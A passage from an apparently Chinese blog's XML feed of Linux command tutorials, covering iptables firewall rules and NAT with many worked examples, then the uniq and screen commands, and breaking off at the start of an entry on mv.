initerface）指定要处理来自哪个接口的数据包（一般指定网卡）这些数据包即将进入 INPUT、FORWARD、PREROUTE链例如：-i etho 指定了要处理经由eth0进入的数据包不指定-i参数，那么将处理进入所有接口的数据包如果出现! -i eth0，那么将处理所有经由eth0意外的接口进入的数据包。出现-i eth+，那么将处理所有经由eth开都的接口进入的数据包还可以使用-in-interface参数 -o 输出（out interface）指定数据包由哪个接口输出这些数据包即将进入FORWARD、OUTPUT、PORTROUTING链不指定 -o 选项，那么系统哈斯那个的所有接口都可以作为输出接口出现 ! -o eth0 那么将从 eth0以外的接口 输出出现 ! eth+ ，那么将仅从 eth开头的接口 输出还可以使用 -out-initerface 参数 描述规则扩展参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对规则有了基本描述以后，有时候还希望指定端口、TCP标志、ICMP类型等内容。 –sport 源端口（source port） 针对 -p tcp 或者 -p udp缺省情况下，将匹配所有端口可以指定端口号或者端口名称，（例如，-sport 22 与 -sport ssh）/etc/services 文件描述了上述映射关系从性能上讲，使用端口号更好使用冒号可以匹配端口范围，如“-sport 22:100”还可以使用 -source-port –dport 目的端口（destination port） 针对 -p tcp 或者 -p udp参数和-sport类似还可以使用 -destination-port –tcp-flage TCP标志 针对 -p tcp可以指定由逗号分割的多个参数有效值可以是：SYN、ACK、FIN、RST、URG、PSH可以使用 ALL 或者 NONE –icmp-type ICMP类型 针对 -p icmp–icmp-type 0 表示Echo Reply–icmp-type 8 表示Echo iptables处理数据包的四种方式 ACCEPT 允许数据包通过 DROP 直接丢弃数据包，不给任何回应信息 REJECT 拒绝数据包通过，必要时会给数据发送端一个响应的信息。 LOG在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则 iptables传输数据包的过程 当一个数据包进入网卡时，它首先进入PREROUTING链，内核根据数据包目的IP判断是否需要转送出去。 如果数据包就是进入本机的，它就会沿着图向下移动，到达INPUT链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过OUTPUT链，然后到达POSTROUTING链输出。 如果数据包是要转发出去的，且内核允许转发，数据包就会如图所示向右移动，经过FORWARD链，然后到达POSTROUTING链输出。 iptables的规则表和链&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表（tables）提供的特定的功能，iptables内置了4个表，即filter表、nat表、mangle表、和raw表，分别用于实现包过滤，网络地址转换、包重构（修改）和数据跟踪处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;链（chains）是数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一条或数条规则。当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，看该数据包是否满足规则所定义的条件。如果满足，系统就会根据该条规则所定义的方法处理该数据包；否则iptables将继续检查下一条规则，如果该数据包不符号链中任一条规则，iptables就会根据该链预先定义的默认策略来处理数据包。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;iptables采用“表”和“链”的分层结构。在REHL4中是三张表五个链。现在REHL5成了四张表五个链了，不过多出来的哪个表用的也不太多，所以基本还是和以前一样。下面是四张表五个链。需要明白这些表和链的关系及作用。 规则表 filter表——三个链：INPUT、FORWARD、OUTPUT作用：过滤数据包，内核模块：iptables=_filter Nat表——三个链：PREROUTING、POSTROUTING、OUTPUT作用：用于网络地址转换（IP、端口），内核模块：iptable_nat Mangle表——五个链：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD作用：修改数据包的服务类型、TTL，并且可以配置路由实现QOS，内核模块：iptable_mangle（设置策略时几乎不会用到它） Raw表——两个链：OUTPUT、PREROUTING作用：决定数据包是否被状态跟踪机制处理，内核模块：iptable_raw（用得不多） 规则链 INPUT——进来的数据包应用此规则链中的策略 OUTPUT——外出的数据包应用此规则链中的策略 ROEWARD——转发数据包时应用此规则链中的策略 PREROUTING——对数据包做路由选择前应用此链中的规则（所有的数据包进来的时候都先由这个链处理） POSTROUTING——对数据包作路由选择后应用此链中的规则（所有的数据包出来的时候都先由这个链处理） 规则表之间的有限顺序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Raw——Mangle——Nat——Filter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;规则链之间的优先顺序分三种情况 1、入站数据流向&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从外界达到防火墙的数据包，先被PREROUTING规则链处理（是否修改数据包地址等），之后会进行路由选择（判断该数据包应该发往何处），如果数据包的目标主机是防火墙本机（比如说internet用户访问防火墙主机中的web服务器的数据包）， 那么内核将其传给INPUT链进行处理（决定是否允许通过等），通过以后再给系统上层的应用程序（比如apache服务器）进行响应。 2、转发数据流向&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;来自外界的数据包到达防火墙后，首先被PREROUTING规则链处理，之后会进行路由选择，如果数据包的目标地址是其他外部地址（比如局域网用户通过网关访问QQ站点的数据包），则内核将其传递给FPRWARD链进行处理（是否转发或拦截），然后再交给POSTROUTING规则链（是否修改数据包的地址等）进行处理。 3、出站数据流向&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;防火墙本机向外部地下hi发送的数据包（比如在防火墙主机中测试公网DNS服务器时），首先被OUTPUT规则链处理，之后进行路由选择，然后传递给POSTROUTING规则链（是否修改数据包的地址等）进行处理。 管理和设置iptables规则 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面针对一个小需求讲述一下这个iptables规则如何设定： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求：只针对filter表，预设策略INPUT链DROP，其他两个链ACCEPT，然后针对192.168.137.0/24开通22端口，对所有网段开放80端口，对素有网段开放21端口。这个需求不复制，但是有很多条规则，所以最好写成脚本形式： 123456789101112[root@localhost ~]# vim /usr/local/sbin/iptables.sh#!/bin/bashipt="/sbin/iptables"$ipt -F$ipt -P INPUT DROP$ipt -P OUTPUT ACCEPT$ipt -P FORWARD ACCEPR$ipt -A INPUT -s 192.168.137.0/24 -p tcp --dport 22 -j ACCEPT$ipt -A INPUT -p tcp --dport 80 -j ACCEPT$ipt -A INPUT -p tcp --dport 21 -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;完成脚本编写后，直接运行即可。如果想开机启动时初始化防火墙规则，需要在 /etc/rc.d/rc.local 中添加一行 /bin/bash /usr/local/sbin/iptables.sh 1234567[root@localhost ~]# sh /usr/local/sbin/iptables.sh[root@localhost ~]# iptables -nvLChain INPUT (policy DROP 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 20 1580 ACCEPT tcp -- * * 192.168.137.0/24 0.0.0.0/0 tcp dpt:22 0 0 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 0 0 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:21 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行脚本后，查看规则就是这样的，可以看到第一条规则中已经有20个包被放行了。关于icmp的包有一个比较常见的应用： 1root@localhost ~]# iptables -I INPUT -p icmp --icmp-type 8 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; –icmp-type 这个选项是要跟 -p icmp 一起使用的，后i安指定类型编号。这个8指的是能在本机ping同其他机器，而其他机器不能ping通本机。 nat表的应用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实，linux的iptables功能是十分强大的，曾经有一个老师这样形容Linux的网络功能：只有想不到，没有做不到！也就是说只要能够想到的关于网络的应用，Linux都能实现。在日常生活中使用的路由器，它的功能就是分享上网。本来一跟网线过来（其实只有一个公网IP），通过路由器后，路由器分配了一个网段（私网IP），这样连接路由器的台机器都能连接internet，而远端的设备认为IP就是那个连接路由器的公网IP。这个路由器的功能其实就是有Linux的iptables实现的，而iptables又是通过nat表作用而实现的这个功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;举个例子来说明iptables如何实现的这个功能。假设机器上有两块网卡etho0和eth1，其中eth0的IP为10.0.2.68，eth1的IP为192.168.1.1.eth0连接了internet，但eth1没有连接，现在有另一台机器（192.168.1.2）和eth1是互通的，那么如何设置也能够让连接eth1的这台机器能够连接internet（即能和10.0.2.68互通）？ 12[root@localhost ~]# echo "1" &gt; /proc/sys/net/ipv4/ip_forward[root@localhost ~]# iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就是这样简单的两条命令就能实现上面的需求。第一个命令涉及到了内核参数相关的配置文件，它的目的是为了打开路由转发功能，否则无法实现应用。第二个命令则是iptables对nat表做了一个IP转发的操作，-o选项后跟设备名，表示出口的网卡，MASQUERADE表示伪装的意思。 iptables防火墙规则的保存与恢复&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;iptables-save把规则保存到文件中，再由目录rc.d下个脚本（/etc/rc.d/init.d/iptables）自动装载 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用命令iptables-save来保存规则。一般用 1iptables-save &gt; /etc/sysconfig/iptables &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生成保存规则的文件/etc/sysconfig/iptables, &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以用 1service iptables save &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它能把规则自动保存在/etc/sysconfig/iptables中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当计算机启动时，rc.d下的脚本将用命令iptables-restore调用这个文件，从而就自动恢复了规则。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-nvL就是查看规则，-F是把当前规则清除，但这个只是临时的，重启系统或者重启iptables服务后还回加载已经保存的规则，所以需要使用/etc/init.d/iptables save保存一下规则 1iptables -F ; /etc/init.d/iptables save 使用实例实例1：查看规则以及清除规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iptables -t nat -nvL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# iptables -t nat -nvLChain PREROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-t后面跟表名，-nvL即查看该表的规则，其中-n表示不针对IP反解析主机名；-L表示列出的意思；而-v表示列出的信息更加详细。。如果不加-t，则打印filter表的相关信息： 123456789[root@localhost ~]# iptables -nvLChain INPUT (policy ACCEPT 121 packets, 9013 bytes) pkts bytes target prot opt in out source destination Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 85 packets, 8828 bytes) pkts bytes target prot opt in out source destination &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个和-t filter打印的信息是一样的。 实例2：清除iptables规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12iptables -Fiptables -Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不加-t默认是针对表filter来操作的，-F表示把所有规则全部删除；-Z表示把包以及流量计数器清零。 实例3：增加一条规则1[root@localhost ~]# iptables -A INPUT -s 10.72.11.12 -p tcp --sport 1234 -d 10.72.137.159 --dport 80 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这就是增加一条规则，省略-t所以针对filter表。-A表示增加一条规则，另外还有-I表示插入一条规则，-D删除一条规则；后面个INPUT既链名称，还可以是OUTPUT或者FORWARD；-s后跟源地址；-p协议（tcp、udp、icmp）；--sport/--dport后跟源端口；-d后跟目的IP（主要针对内网或者外网）；-j后跟动作（DROP即把包丢掉，REJECT即包拒绝；ACCEPT即允许包）。 实例4：插入一条规则，把来自1.1.1.1的所有数据包丢掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1[root@localhost ~]# iptables -I INPUT -s 1.1.1.1 -j DROP 实例5：删除一条规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1[root@localhost ~]# iptables -D INPUT -s 1.1.1.1 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除实例4中插入的规则。注意要删除一条规则时，必须和插入的规则一致，也就是说两条iptables命令，除了-I和-D不一样外，其他地方都一样 实例6：把来自2.2.2.2并且是tcp协议到本机80端口的数据包球吊&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1[root@localhost ~]# iptables -I INPUT -s 2.2.2.2 -p tcp --dport 80 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要注意的是--dport/--sport必须要和-p选项一起使用，否则会出错。 实例7：把发送到10.0.1.14的22端口的数据包丢掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1[root@localhost ~]# iptables -I OUTPUT -p tcp --dport 22 -d 10.0.1.14 -j DROP 实例8：把来自192.168.0.0/24这个网段的并且作用在eth0上的数据包都放行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123[root@localhost ~]# iptables -A INPUT -s 192.168.0.0/24 -i eth0 -j ACCEPT[root@localhost ~]# iptables -nvL | grep '192.168.0.0/24' 65 4680 ACCEPT all -- eth0 * 192.168.0.0/24 0.0.0.0/0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-I 和 -A 都是增加规则，它们的去区别是。 -A 可以说是往后排，-I 是直接插队到最前面。也就是说 -A 增加的规则是在最后面的，而 -I 增加的规则是在最前面的。数据包流向是从前往后走，所以如果想让一条规则最优先生效，那么就用 -I 插入一条规则。 实例9：iptables删除某一条规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;iptables过多了，想删除某一条规则时，又不容易掌握当时创建时的规则。其实有一种比较简单的方法: 123456789101112[root@localhost ~]# iptables -nvL --line-numbersChain INPUT (policy ACCEPT 12 packets, 648 bytes)num pkts bytes target prot opt in out source destination 1 0 0 DROP tcp -- * * 2.2.2.2 0.0.0.0/0 tcp dpt:80 2 132 9309 ACCEPT all -- eth0 * 192.168.0.0/24 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)num pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 90 packets, 8816 bytes)num pkts bytes target prot opt in out source destination 1 0 0 DROP tcp -- * * 0.0.0.0/0 10.0.1.14 tcp dpt:22 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除某一条规则使用如下命令： 1[root@localhost ~]# iptables -D INPUT 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-D后跟链名，然后是规则num，这个num就是查看iptables规则时第一列的值。再次查看刚才的规则，INPUT里已经没有第2条了 1234567891011[root@localhost ~]# iptables -nvL --line-numbersChain INPUT (policy ACCEPT 7 packets, 504 bytes)num pkts bytes target prot opt in out source destination 1 0 0 DROP tcp -- * * 2.2.2.2 0.0.0.0/0 tcp dpt:80 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)num pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 5 packets, 604 bytes)num pkts bytes target prot opt in out source destination 1 0 0 DROP tcp -- * * 0.0.0.0/0 10.0.1.14 tcp dpt:22 实例10：接收目标端口为22的数据包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iptables -A INPUT -i eth0 -p tcp --dport 22 -j ACCEPT 实例11：拒绝所有其他数据包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iptables -A INPUT -j DROP 实例12：iptables -P选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1root@localhost ~]# iptables -P INPUT DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-P选项经常用到，表示预设策略。 -P 后面跟链名，策略内容或者为DROP或者为ACCEPT，默认是ACCEPT。注意：如果在连接远程服务器，千万不要随便敲这个命令，因为一旦钓完回车就会断掉。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 这个策略一旦设定后，只能使用 iptables -P INPUT ACCEPT 才能恢复成原始状态，而不能使用-F参数。 实例13：iptables实现内网机器访问外网&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境：两台机器，一台可以访问外网、内网，一台只能访问内网 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;外网机器的外网IP：123.221.20.11；内网IP为：192.168.15.100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内网机器IP：192.168.15.101&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置方法： 在外网机器上设置iptables规则： 1[root@localhost ~]# iptables -t nat -A POSTROUTING -s 192.168.15.101 -j SNAT --to 123.221.20.11 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 注意 :如果想让整个内网的机器全部上网，只需要把 -s 192.168.15.101 换成 -s 192.168.15.0/255.255.255.0 即可 在带外网机器上打开转发&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先查看是否已经打开 1[root@localhost ~]# sysctl -a | grep 'net.ipv4.ip_forward' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果值为1，则说明已经打开，否则需要修改匹配文件 /etc/sysctl.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开该配置文件，找到该参数，使其变为 1net.ipv4.ip_forward = 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后运行 1sysctl -p 在内网机器上，设置其网关为 192.168.15.100 123[root@localhost ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0 GATEWAY=192.168.15.100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启网络服务即可 1service network restart 测试内网机器是否可以上网 实例14：iptables限制syn速度&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 原理 ：每5s内tcp三次握手大于20次的属于不正常访问。 12[root@localhost ~]# iptables -A INPUT -s ! 192.168.0.0/255.255.255.0 -d 192.168.0.101 -p tcp -m tcp --dport 80 -m state --state NEW -m recent --set --name httpuser --rsource[root@localhost ~]# iptables -A INPUT -m recent --update --seconds 5 --hitcount 20 --name httpuser --rsource -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中192.168.0.0/255.255.255.0为不受限制的网段，192.168.0.101 为本机IP。该iptables策略，可有效预防syn攻击，也可以有效防止机器人发垃圾贴。 实例15：拒绝进入防火墙的所有ICMP协议数据包1iptables -I INPUT -p icmp -j REJECT 实例16:允许防火墙转发除ICMP协议以外的所有数据包1iptables -A FORWARD -p ! icmp -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：使用“!”可以将条件取反 实例17：拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段的数据12iptables -A FORWARD -s 192.168.1.11 -j REJECTiptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：注意要把拒绝的放在前面，不然就不起作用了。 实例18：丢弃从外网接口（eth1）进入防火墙本机的源地址为私网地址的数据包123iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROPiptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROPiptables -A INPUT -i eth1 -s 10.0.0.0.0/8 -j DROP 实例19：封堵网段（192.168.1.0/24），两小时后解封123iptables -I INPUT -s 10.20.30.0/24 -j DROPiptables -I FORWARD -s 10.20.30.0/24 -j DROPat now 2 hours at&gt; iptables -D INPUT 1 at&gt; iptables -D FORWARD 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：这个策略借助crontab计划任务来完成，就再好不过了。 1[1] Stopped at now 2 hours 实例20：只允许管理员从202.13.0.0/16网段使用SSH远程登录防火墙主机12iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPTiptables -A INPUT -p tcp --dport 22 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：这个用法比较适合对设备进行远程管理时使用，比如位于分公司中的SQL服务器需要被总公司的管理员管理时。 实例21：允许本机开放从TCP端口20-1024提供的应用服务12iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPTiptables -A INPUT -p tcp --sport 20:1024 -j ACCEPT 实例22：允许转发来自192.168.0.0/24局域网的DNS解析请求数据包12iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPTiptables -A FORWARD -s 192.168.0.0/24 -p udp --sport 53 -j ACCEPT 实例23：禁止其他主机ping防火墙主机，但是允许防火墙上ping其他主机123iptables -I INPUT -p icmp --icmp-type Echo-Request -j DROPiptables -I INPUT -p icmp --icmp-type Echo-Reply -j ACCEPTiptables -I INPUT -p icmp --icmp-type destination-Unreachable -j ACCEPT 实例24：禁止转发来自MAC地址为00:0C:29:27:55:3F的和主机的数据包1iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3f -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 :iptables中使用 -m 模块关键字 的形式调用显示匹配。这里用 -m mac --mac-source来表示数据包的源MAC地址。 实例25：允许防火墙本机对外开放TCP端口 20、21、25、110以及被动模式FTP端口1250-12801iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：这里使用 -m multiport -dport 来指定目的端口及范围 实例26：禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包1iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：此处用 -m -iprange --src-range指定IP范围 实例27：禁止转发与正常TCP连接无关的非-syn请求数据包1iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：-m state 表示数据包的俩节状态，NEW表示与任何 连接无关的，新的嘛！ 实例28：拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包12iptables -A INPUT -p tcp -m state --state NEW -j DROPiptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 ：ESTABLISHED 表示已经响应请求或者已经建立连接的数据包，RELATED 表示与已建立的连接有相关性的，比如FTP数据连接等。 实例29：只开放本机的web服务（80）、FTP（20、21、20340-20480），放行外部主机发往服务器其他端口的应答数据包，将其他入站数据包均以丢弃处理1234iptables -I INPUT -p tcp -m multiport --dport 20,21,80 -j ACCEPTiptables -I INPUT -p tcp --dport 2045:20480 -j ACCEPTiptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPTiptables -P INPUT DROP]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- uniq]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F66.%20Linux%20%E5%91%BD%E4%BB%A4-%20uniq%2F</url>
    <content type="text"><![CDATA[Linux 命令- uniq&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux uniq 命令用于检查及删除文本文件中重复的行列。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;uniq 可检查文本文件中重复出现的行列。 1. 命令语法1uniq [参数] [file] 2. 命令参数 -c或–count 在每列旁边显示该行重复出现的次数。 -d或–repeated 仅显示重复出现的行列。 -f&lt;栏位&gt;或–skip-fields=&lt;栏位&gt; 忽略比较指定的栏位。 -s&lt;字符位置&gt;或–skip-chars=&lt;字符位置&gt; 忽略比较指定的字符。 -u或–unique 仅显示出一次的行列。 -w&lt;字符位置&gt;或–check-chars=&lt;字符位置&gt; 指定要比较的字符。 –help 显示帮助。 –version 显示版本信息。 [输入文件] 指定已排序好的文本文件。 [输出文件] 指定输出的文件。 3. 使用实例实例1：文件 testfile 中第2、5、9行为相同的行，使用 uniq 命令删除重复的行。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1uniq testfile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314$ cat testfile #原有内容 test 30 test 30 test 30 Hello 95 Hello 95 Hello 95 Hello 95 Linux 85 Linux 85 $ uniq testfile #删除重复行后的内容 test 30 Hello 95 Linux 85 实例2：检查文件并删除文件中重复出现的行，并在行首显示该行重复出现的次数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1uniq -c testfile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234$ uniq-ctestfile #删除重复行后的内容 3 test 30 #前面的数字的意义为该行共出现了3次 4 Hello 95 #前面的数字的意义为该行共出现了4次 2 Linux 85 #前面的数字的意义为该行共出现了2次]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- screen]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F82.%20Linux%20%E5%91%BD%E4%BB%A4-%20screen%2F</url>
    <content type="text"><![CDATA[Linux 命令- screen&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;screen命令用于多重视窗管理程序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;screen为多重视窗管理程序。所谓的视窗，是指一个全屏幕的文字模式画面。通常只有在使用telnet登入主机或是使用老式终端机时，才有可能用到screen程序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，也许会有这样的需求。要执行一个命令或者脚本，但是需要几个小时甚至几天。这就要考虑一个问题，就是中途断网或出现其他意外情况，执行的任务中断了怎么办？可以把命令或者脚本丢到后台运行，不过也不保险。screen可以避免这样的问题发生。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;screen中有会话的概念，用户可以在一个screen会话中创建多个screen窗口，在每一个窗口中就想操作一个真实的SSH连接窗口那样。 命令语法1screen [-AmRvx -ls -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r &lt;作业名称&gt;][-s &lt;shell&gt;][-S &lt;作业名称&gt;] 命令参数 -A 将所有的视窗都调整为目前终端机的大小。 -d&lt;作业名称&gt; 将指定的screen作业离线。 -h&lt;行数&gt; 指定视窗的缓冲区行数。 -m 即使目前已在作业中的screen作业，仍强制建立新的screen作业。 -r&lt;作业名称&gt; 恢复离线的screen作业。 -R 先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。 -s 指定建立新视窗时，所要执行的shell。 -S&lt;作业名称&gt; 指定screen作业的名称。 -v 显示版本信息。 -x 恢复之前离线的screen作业。 -ls或–list 显示目前所有的screen作业。 -wipe 检查目前所有的screen作业，并删除已经无法使用的screen作业。 命令实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果没有screen命令需先安装 1yum install -y screen &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建screen终端 1[root@localhost ~]# screen &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建 screen 终端 ，并执行 vi命令 12345678910[root@localhost ~]# screen vi ~/main.c #include main ()&#123;&#125;"~/mail.c" 0,0-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Ctrl+a 再按d键，退出该screen回话，只是退出，并没有结束。需要结束的话输入 Ctrl+d 或者输入 exit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; screen -ls 查看已经打开的screen会话 123[root@localhost ~]# screen -lsThere is a screen on:20001.pts-0.localhost (Attached) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退出后还想再次登录某个screen会话，使用 sreen -r [screen编号] ，这个编号就是上例中那个20001.当只有一个screen会话时，后面的编号是可以省略的。当有某个需要长时间运行的命令或者脚本时就打开一个screen会话，然后运行该任务。按 ctrl+a d退出会话，不影响终端窗口上的任何操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建新的screen是可以指定自定义名称的 1[root@localhost ~]# screen -S yanyi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要想进入该screen，可以直接 1screen -r yanyi screen源码编译安装12345678[root@host1 src]# wget ftp://ftp.gnu.org/pub/gnu/screen/screen-4.0.3.tar.gz[root@host1 src]# tar -xvf screen-4.0.3.tar.gz[root@host1 src]# cd screen-4.0.3[root@host1 screen-4.0.2]# ./configure[root@host1 screen-4.0.2]# make[root@host1 screen-4.0.2]# make install[root@host1 screen-4.0.2]# install -m 644 etc/etcscreenrc /etc/screenrc[root@host1 screen-4.0.2]# cp ./screen /bin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意和一般程序的安装过程有所不同，后面两条命令一定要执行。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- mv]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F8.%20Linux%20%E5%91%BD%E4%BB%A4-%20mv%2F</url>
